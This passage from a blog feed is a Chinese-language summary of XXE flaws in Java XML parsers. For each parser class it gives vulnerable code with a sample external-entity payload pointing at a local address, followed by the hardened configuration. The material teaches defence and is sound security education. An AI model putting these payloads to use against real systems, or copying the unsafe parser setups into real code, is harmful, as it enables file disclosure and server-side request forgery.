\"http://127.0.0.1:8888\"&gt;\n"</span> +</span><br><span class="line">    <span class="string">"]&gt;&lt;doc&gt;&amp;xxe;&lt;/doc&gt;"</span>;</span><br><span class="line">    InputStream is = <span class="keyword">new</span> ByteArrayInputStream(str.getBytes());</span><br><span class="line">    Document doc = db.parse(is);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修复代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();     </span><br><span class="line"><span class="comment">/*以下为修复代码*/</span>            <span class="comment">//https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet#Java</span></span><br><span class="line"><span class="comment">//禁用DTDs (doctypes),几乎可以防御所有xml实体攻击</span></span><br><span class="line">dbf.setFeature(<span class="string">"http://apache.org/xml/features/disallow-doctype-decl"</span>, <span class="keyword">true</span>); <span class="comment">//首选</span></span><br><span class="line"><span class="comment">//如果不能禁用DTDs,可以使用下两项，必须两项同时存在</span></span><br><span class="line">dbf.setFeature(<span class="string">"http://xml.org/sax/features/external-general-entities"</span>, <span class="keyword">false</span>);        <span class="comment">//防止外部实体POC </span></span><br><span class="line">dbf.setFeature(<span class="string">"http://xml.org/sax/features/external-parameter-entities"</span>, <span class="keyword">false</span>);   <span class="comment">//防止参数实体POC</span></span><br><span class="line"><span class="comment">/*以上为修复代码*/</span>    </span><br><span class="line">DocumentBuilder db = dbf.newDocumentBuilder();        </span><br><span class="line">Document doc = db.parse(request.getInputStream());</span><br></pre></td></tr></table></figure><p>或</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();</span><br><span class="line">String FEATURE = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">FEATURE = <span class="string">"http://apache.org/xml/features/disallow-doctype-decl"</span>;</span><br><span class="line">dbf.setFeature(FEATURE, <span class="keyword">true</span>);</span><br><span class="line"><span class="comment">// If you can't completely disable DTDs, then at least do the following:</span></span><br><span class="line"><span class="comment">// Xerces 1 - http://xerces.apache.org/xerces-j/features.html#external-general-entities</span></span><br><span class="line"><span class="comment">// Xerces 2 - http://xerces.apache.org/xerces2-j/features.html#external-general-entities</span></span><br><span class="line"><span class="comment">// JDK7+ - http://xml.org/sax/features/external-general-entities</span></span><br><span class="line">FEATURE = <span class="string">"http://xml.org/sax/features/external-general-entities"</span>;</span><br><span class="line">dbf.setFeature(FEATURE, <span class="keyword">false</span>);</span><br><span class="line"><span class="comment">// Xerces 1 - http://xerces.apache.org/xerces-j/features.html#external-parameter-entities</span></span><br><span class="line"><span class="comment">// Xerces 2 - http://xerces.apache.org/xerces2-j/features.html#external-parameter-entities</span></span><br><span class="line"><span class="comment">// JDK7+ - http://xml.org/sax/features/external-parameter-entities</span></span><br><span class="line">FEATURE = <span class="string">"http://xml.org/sax/features/external-parameter-entities"</span>;</span><br><span class="line">dbf.setFeature(FEATURE, <span class="keyword">false</span>);</span><br><span class="line"><span class="comment">// Disable external DTDs as well</span></span><br><span class="line">FEATURE = <span class="string">"http://apache.org/xml/features/nonvalidating/load-external-dtd"</span>;</span><br><span class="line">dbf.setFeature(FEATURE, <span class="keyword">false</span>);</span><br><span class="line"><span class="comment">// and these as well, per Timothy Morgan's 2014 paper: "XML Schema, DTD, and Entity Attacks"</span></span><br><span class="line">dbf.setXIncludeAware(<span class="keyword">false</span>);</span><br><span class="line">dbf.setExpandEntityReferences(<span class="keyword">false</span>);</span><br><span class="line">&gt;..</span><br><span class="line"><span class="comment">// Load XML file or stream using a XXE agnostic configured parser...</span></span><br><span class="line">DocumentBuilder safebuilder = dbf.newDocumentBuilder();</span><br></pre></td></tr></table></figure><h3 id="0x02-SAXBuilder"><a href="#0x02-SAXBuilder" class="headerlink" title="0x02.SAXBuilder"></a>0x02.SAXBuilder</h3><p>java组件：org.jdom2.input.SAXBuilder</p><p>漏洞代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span>  Exception </span>&#123;</span><br><span class="line">    String str = <span class="string">"&lt;!DOCTYPE doc [ \n"</span> +</span><br><span class="line">    <span class="string">"&lt;!ENTITY xxe SYSTEM \"http://127.0.0.1:8888\"&gt;\n"</span> +</span><br><span class="line">    <span class="string">"]&gt;&lt;doc&gt;&amp;xxe;&lt;/doc&gt;"</span>;</span><br><span class="line">    InputStream is = <span class="keyword">new</span> ByteArrayInputStream(str.getBytes());</span><br><span class="line">    SAXBuilder sb = <span class="keyword">new</span> SAXBuilder();</span><br><span class="line">    Document doc = sb.build(is);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修复代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SAXBuilder sb = <span class="keyword">new</span> SAXBuilder();</span><br><span class="line">sb.setFeature(<span class="string">"http://apache.org/xml/features/disallow-doctype-decl"</span>, <span class="keyword">true</span>);</span><br><span class="line">sb.setFeature(<span class="string">"http://xml.org/sax/features/external-general-entities"</span>, <span class="keyword">false</span>);</span><br><span class="line">sb.setFeature(<span class="string">"http://xml.org/sax/features/external-parameter-entities"</span>, <span class="keyword">false</span>);</span><br><span class="line">sb.setFeature(<span class="string">"http://apache.org/xml/features/nonvalidating/load-external-dtd"</span>, <span class="keyword">false</span>);</span><br><span class="line">Document doc = sb.build(is);</span><br></pre></td></tr></table></figure><h3 id="0x03-SAXParserFactory"><a href="#0x03-SAXParserFactory" class="headerlink" title="0x03.SAXParserFactory"></a>0x03.SAXParserFactory</h3><p>java组件：javax.xml.parsers.SAXParser / javax.xml.parsers.SAXParserFactory</p><p>漏洞代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span>  Exception </span>&#123;</span><br><span class="line">    String str = <span class="string">"&lt;!DOCTYPE doc [ \n"</span> +</span><br><span class="line">    <span class="string">"&lt;!ENTITY xxe SYSTEM \"http://127.0.0.1:8888\"&gt;\n"</span> +</span><br><span class="line">    <span class="string">"]&gt;&lt;doc&gt;&amp;xxe;&lt;/doc&gt;"</span>;</span><br><span class="line">    InputStream is = <span class="keyword">new</span> ByteArrayInputStream(str.getBytes());</span><br><span class="line">    SAXParserFactory spf = SAXParserFactory.newInstance();</span><br><span class="line">    SAXParser parser = spf.newSAXParser();</span><br><span class="line">    parser.parse(is, (HandlerBase) <span class="keyword">null</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修复代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SAXParserFactory spf = SAXParserFactory.newInstance();</span><br><span class="line">spf.setFeature(<span class="string">"http://apache.org/xml/features/disallow-doctype-decl"</span>, <span class="keyword">true</span>);</span><br><span class="line">spf.setFeature(<span class="string">"http://xml.org/sax/features/external-general-entities"</span>, <span class="keyword">false</span>);</span><br><span class="line">spf.setFeature(<span class="string">"http://xml.org/sax/features/external-parameter-entities"</span>, <span class="keyword">false</span>);</span><br><span class="line">spf.setFeature(<span class="string">"http://apache.org/xml/features/nonvalidating/load-external-dtd"</span>, <span class="keyword">false</span>);</span><br><span class="line">SAXParser parser = spf.newSAXParser();</span><br></pre></td></tr></table></figure><h3 id="0x04-SAXTransformerFactory"><a href="#0x04-SAXTransformerFactory" class="headerlink" title="0x04.SAXTransformerFactory"></a>0x04.SAXTransformerFactory</h3><p>java组件：javax.xml.transform.sax.SAXTransformerFactory。</p><p>漏洞代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span>  Exception </span>&#123;</span><br><span class="line">    String str = <span class="string">"&lt;!DOCTYPE doc [ \n"</span> +</span><br><span class="line">    <span class="string">"&lt;!ENTITY xxe SYSTEM \"http://127.0.0.1:8888\"&gt;\n"</span> +</span><br><span class="line">    <span class="string">"]&gt;&lt;doc&gt;&amp;xxe;&lt;/doc&gt;"</span>;</span><br><span class="line">    InputStream is = <span class="keyword">new</span> ByteArrayInputStream(str.getBytes());</span><br><span class="line">    SAXTransformerFactory sf = (SAXTransformerFactory) SAXTransformerFactory.newInstance();</span><br><span class="line">    StreamSource source = <span class="keyword">new</span> StreamSource(is);</span><br><span class="line">    sf.newTransformerHandler(source);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修复代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SAXTransformerFactory sf = (SAXTransformerFactory) SAXTransformerFactory.newInstance();</span><br><span class="line">sf.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, <span class="string">""</span>);</span><br><span class="line">sf.setAttribute(XMLConstants.ACCESS_EXTERNAL_STYLESHEET, <span class="string">""</span>);</span><br><span class="line">StreamSource source = <span class="keyword">new</span> StreamSource(is);</span><br><span class="line">sf.newTransformerHandler(source);</span><br></pre></td></tr></table></figure><h3 id="0x05-SAXReader"><a href="#0x05-SAXReader" class="headerlink" title="0x05.SAXReader"></a>0x05.SAXReader</h3><p>java组件：org.dom4j.io.SAXReader</p><p>漏洞代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span>  Exception </span>&#123;</span><br><span class="line">    String str = <span class="string">"&lt;!DOCTYPE doc [ \n"</span> +</span><br><span class="line">    <span class="string">"&lt;!ENTITY xxe SYSTEM \"http://127.0.0.1:8888\"&gt;\n"</span> +</span><br><span class="line">    <span class="string">"]&gt;&lt;doc&gt;&amp;xxe;&lt;/doc&gt;"</span>;</span><br><span class="line">    InputStream is = <span class="keyword">new</span> ByteArrayInputStream(str.getBytes());</span><br><span class="line">    SAXReader saxReader = <span class="keyword">new</span> SAXReader();</span><br><span class="line">    saxReader.read(is);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修复代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SAXReader saxReader = <span class="keyword">new</span> SAXReader();</span><br><span class="line">saxReader.setFeature(<span class="string">"http://apache.org/xml/features/disallow-doctype-decl"</span>, <span class="keyword">true</span>);</span><br><span class="line">saxReader.setFeature(<span class="string">"http://xml.org/sax/features/external-general-entities"</span>, <span class="keyword">false</span>);</span><br><span class="line">saxReader.setFeature(<span class="string">"http://xml.org/sax/features/external-parameter-entities"</span>, <span class="keyword">false</span>);</span><br><span class="line">saxReader.setFeature(<span class="string">"http://apache.org/xml/features/nonvalidating/load-external-dtd"</span>, <span class="keyword">false</span>);</span><br><span class="line">saxReader.read(is);</span><br></pre></td></tr></table></figure><h3 id="0x06-XMLReader"><a href="#0x06-XMLReader" class="headerlink" title="0x06.XMLReader"></a>0x06.XMLReader</h3><p>java组件：org.xml.sax.helpers.XMLReaderFactory</p><p>漏洞代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    String str = <span class="string">"&lt;!DOCTYPE doc [ \n"</span> +</span><br><span class="line">    <span class="string">"&lt;!ENTITY xxe SYSTEM \"http://127.0.0.1:8888\"&gt;\n"</span> +</span><br><span class="line">    <span class="string">"]&gt;&lt;doc&gt;&amp;xxe;&lt;/doc&gt;"</span>;</span><br><span class="line">    InputStream is = <span class="keyword">new</span> ByteArrayInputStream(str.getBytes());</span><br><span class="line">    XMLReader reader = XMLReaderFactory.createXMLReader();</span><br><span class="line">    reader.parse(<span class="keyword">new</span> InputSource(is));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修复代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">XMLReader reader = XMLReaderFactory.createXMLReader();</span><br><span class="line">reader.setFeature(<span class="string">"http://apache.org/xml/features/disallow-doctype-decl"</span>, <span class="keyword">true</span>);</span><br><span class="line">reader.setFeature(<span class="string">"http://apache.org/xml/features/nonvalidating/load-external-dtd"</span>, <span class="keyword">false</span>);</span><br><span class="line">reader.setFeature(<span class="string">"http://xml.org/sax/features/external-general-entities"</span>, <span class="keyword">false</span>);</span><br><span class="line">reader.setFeature(<span class="string">"http://xml.org/sax/features/external-parameter-entities"</span>, <span class="keyword">false</span>);</span><br><span class="line">reader.parse(<span class="keyword">new</span> InputSource(is));</span><br></pre></td></tr></table></figure><h3 id="0x07-SchemaFactory"><a href="#0x07-SchemaFactory" class="headerlink" title="0x07.SchemaFactory"></a>0x07.SchemaFactory</h3><p>java组件：javax.xml.validation.SchemaFactory</p><p>漏洞代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    String str = <span class="string">"&lt;!DOCTYPE doc [ \n"</span> +</span><br><span class="line">    <span class="string">"&lt;!ENTITY xxe SYSTEM \"http://127.0.0.1:8888\"&gt;\n"</span> +</span><br><span class="line">    <span class="string">"]&gt;&lt;doc&gt;&amp;xxe;&lt;/doc&gt;"</span>;</span><br><span class="line">    InputStream is = <span class="keyword">new</span> ByteArrayInputStream(str.getBytes());</span><br><span class="line">    SchemaFactory factory = SchemaFactory.newInstance(<span class="string">"http://www.w3.org/2001/XMLSchema"</span>);</span><br><span class="line">    StreamSource source = <span class="keyword">new</span> StreamSource(is);</span><br><span class="line">    Schema schema = factory.newSchema(source);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修复代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SchemaFactory factory = SchemaFactory.newInstance(<span class="string">"http://www.w3.org/2001/XMLSchema"</span>);</span><br><span class="line">factory.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, <span class="string">""</span>);</span><br><span class="line">factory.setProperty(XMLConstants.ACCESS_EXTERNAL_SCHEMA, <span class="string">""</span>);</span><br><span class="line">StreamSource source = <span class="keyword">new</span> StreamSource(is);</span><br><span class="line">Schema schema = factory.newSchema(source);</span><br></pre></td></tr></table></figure><h3 id="0x08-XMLInputFactory"><a href="#0x08-XMLInputFactory" class="headerlink" title="0x08.XMLInputFactory"></a>0x08.XMLInputFactory</h3><p>java组件：javax.xml.stream.XMLInputFactory</p><p>漏洞代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    XMLInputFactory xmlInputFactory = XMLInputFactory.newFactory();</span><br><span class="line">    XMLStreamReader reader = xmlInputFactory.createXMLStreamReader(ResourceUtils.getPoc1());</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">while</span> (reader.hasNext()) &#123;</span><br><span class="line">            <span class="keyword">int</span> type = reader.next();</span><br><span class="line">            <span class="keyword">if</span> (type == XMLStreamConstants.START_ELEMENT) &#123;<span class="comment">//开始节点</span></span><br><span class="line">            System.out.print(reader.getName());</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (type == XMLStreamConstants.CHARACTERS) &#123;<span class="comment">//表示事件字符</span></span><br><span class="line">            System.out.println(<span class="string">"type"</span> + type);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (type == XMLStreamConstants.END_ELEMENT) &#123;<span class="comment">//结束节点</span></span><br><span class="line">            System.out.println(reader.getName());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        reader.close();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修复代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">XMLInputFactory xmlInputFactory = XMLInputFactory.newFactory();</span><br><span class="line">xmlInputFactory.setProperty(XMLInputFactory.SUPPORT_DTD, <span class="keyword">false</span>); </span><br><span class="line">xmlInputFactory.setProperty(XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES, <span class="keyword">false</span>);</span><br><span class="line">XMLStreamReader reader = xmlInputFactory.createXMLStreamReader(ResourceUtils.getPoc1());</span><br></pre></td></tr></table></figure><h3 id="0x09-TransformerFactory"><a href="#0x09-TransformerFactory" class="headerlink" title="0x09.TransformerFactory"></a>0x09.TransformerFactory</h3><p>java组件：javax.xml.transform.TransformerFactory</p><p>漏洞代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span>  Exception </span>&#123;</span><br><span class="line">    String str = <span class="string">"&lt;!DOCTYPE doc [ \n"</span> +</span><br><span class="line">    <span class="string">"&lt;!ENTITY xxe SYSTEM \"http://127.0.0.1:8888\"&gt;\n"</span> +</span><br><span class="line">    <span class="string">"]&gt;&lt;doc&gt;&amp;xxe;&lt;/doc&gt;"</span>;</span><br><span class="line">    InputStream is = <span class="keyword">new</span> ByteArrayInputStream(str.getBytes());</span><br><span class="line">    TransformerFactory tf = TransformerFactory.newInstance();</span><br><span class="line">    StreamSource source = <span class="keyword">new</span> StreamSource(is);</span><br><span class="line">    tf.newTransformer().transform(source, <span class="keyword">new</span> DOMResult());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修复代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">TransformerFactory tf = TransformerFactory.newInstance();</span><br><span class="line">tf.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, <span class="string">""</span>);</span><br><span class="line">tf.setAttribute(XMLConstants.ACCESS_EXTERNAL_STYLESHEET, <span class="string">""</span>);</span><br><span class="line">StreamSource source = <span class="keyword">new</span> StreamSource(is);</span><br><span class="line">tf.newTransformer().transform(source, <span class="keyword">new</span> DOMResult());</span><br></pre></td></tr></table></figure><h3 id="0x10-Validator"><a href="#0x10-Validator" class="headerlink" title="0x10.Validator"></a>0x10.Validator</h3><p>java组件：javax.xml.validation.*</p><p>漏洞代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span>  Exception </span>&#123;</span><br><span class="line">    String str = <span class="string">"&lt;!DOCTYPE doc [ \n"</span> +</span><br><span class="line">    <span class="string">"&lt;!ENTITY xxe SYSTEM \"http://127.0.0.1:8888\"&gt;\n"</span> +</span><br><span class="line">    <span class="string">"]&gt;&lt;doc&gt;&amp;xxe;&lt;/doc&gt;"</span>;</span><br><span class="line">    InputStream is = <span class="keyword">new</span> ByteArrayInputStream(str.getBytes());</span><br><span class="line">    SchemaFactory factory = SchemaFactory.newInstance(<span class="string">"http://www.w3.org/2001/XMLSchema"</span>);</span><br><span class="line">    Schema schema = factory.newSchema();</span><br><span class="line">    Validator validator = schema.newValidator();</span><br><span class="line">    StreamSource source = <span class="keyword">new</span> StreamSource(is);</span><br><span class="line">    validator.validate(source);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修复代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Schema schema = factory.newSchema();</span><br><span class="line">Validator validator = schema.newValidator();</span><br><span class="line">validator.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, <span class="string">""</span>);</span><br><span class="line">validator.setProperty(XMLConstants.ACCESS_EXTERNAL_SCHEMA, <span class="string">""</span>);</span><br><span class="line">StreamSource source = <span class="keyword">new</span> StreamSource(is);</span><br><span class="line">validator.validate(source);</span><br></pre></td></tr></table></figure><h3 id="0x11-Unmarshaller"><a href="#0x11-Unmarshaller" class="headerlink" title="0x11.Unmarshaller"></a>0x11.Unmarshaller</h3><p>java组件：javax.xml.bind.JAXBContext / javax.xml.bind.Unmarshaller</p><blockquote><p>需要指出：这个组件在jdk1.8默认不存在漏洞，在JDK1.6，1.7默认存在漏洞。<a href="https://anquan.baidu.com/article/315" target="_blank" rel="noopener">参考</a></p></blockquote><p>漏洞代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">xmlToObjectXXE</span><span class="params">(String xml, Class&lt;?&gt; klass)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">JAXBContext context = JAXBContext.newInstance(klass);</span><br><span class="line">Unmarshaller unmarshaller = context.createUnmarshaller();</span><br><span class="line"><span class="keyword">return</span> unmarshaller.unmarshal(<span class="keyword">new</span> StringReader(xml));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修复代码:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">xmlToObjectSafe</span><span class="params">(String xml, Class&lt;?&gt; klass)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">JAXBContext context = JAXBContext.newInstance(klass);</span><br><span class="line"></span><br><span class="line">XMLInputFactory xif = XMLInputFactory.newFactory();</span><br><span class="line">xif.setProperty(XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES, <span class="keyword">false</span>);</span><br><span class="line">xif.setProperty(XMLInputFactory.SUPPORT_DTD, <span class="keyword">true</span>);</span><br><span class="line">XMLStreamReader xsr = xif.createXMLStreamReader(<span class="keyword">new</span> StringReader(xml));</span><br><span class="line"></span><br><span class="line">Unmarshaller unmarshaller = context.createUnmarshaller();</span><br><span class="line"><span class="keyword">return</span> unmarshaller.unmarshal(xsr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当<strong>IS_SUPPORTING_EXTERNAL_ENTITIES</strong>为false时，外部实体不会被执行解析<br>当<strong>SUPPORT_DTD</strong>进一步为false时，引入DTD会导致报错。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.w3school.com.cn/xml/index.asp" target="_blank" rel="noopener">https://www.w3school.com.cn/xml/index.asp</a></p><p><a href="https://xz.aliyun.com/t/6829#toc-4" target="_blank" rel="noopener">https://xz.aliyun.com/t/6829#toc-4</a></p><p><a href="http://www.lmxspace.com/2019/10/31/Java-XXE-总结/" target="_blank" rel="noopener">http://www.lmxspace.com/2019/10/31/Java-XXE-总结/</a></p><p><a href="https://anquan.baidu.com/article/315" target="_blank" rel="noopener">https://anquan.baidu.com/article/315</a></p><p><a href="http://rickgray.me/2015/06/08/xml-entity-attack-review/" target="_blank" rel="noopener">http://rickgray.me/2015/06/08/xml-entity-attack-review/</a></p><p><a href="https://xz.aliyun.com/t/3357#toc-15" target="_blank" rel="noopener">https://xz.aliyun.com/t/3357#toc-15</a></p><p><a href="https://blog.netspi.com/forcing-xxe-reflection-server-error-messages/" target="_blank" rel="noopener">https://blog.netspi.com/forcing-xxe-reflection-server-error-messages/</a></p><p><a href="https://blog.h3xstream.com/2019/07/automating-local-dtd-discovery-for-xxe.html" target="_blank" rel="noopener">https://blog.h3xstream.com/2019/07/automating-local-dtd-discovery-for-xxe.html</a></p><p><a href="https://github.com/GoSecure/dtd-finder" target="_blank" rel="noopener">https://github.com/GoSecure/dtd-finder</a></p><p><a href="https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/" target="_blank" rel="noopener">https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;最近先知上看了篇XXE总结的文章，内容不错。整理了一下以前做的笔记复习一下，合成一篇来水一篇。&lt;/p&gt;
&lt;p&gt;XML这东西payload感觉
      
    
    </summary>
    
    
      <category term="web" scheme="http://lalajun.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>JDK反序列化Gadget 7u21</title>
    <link href="http://lalajun.com/2019/11/30/JDK%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadgets%207u21/"/>
    <id>http://lalajun.com/2019/11/30/JDK反序列化Gadgets 7u21/</id>
    <published>2019-11-30T15:05:28.000Z</published>
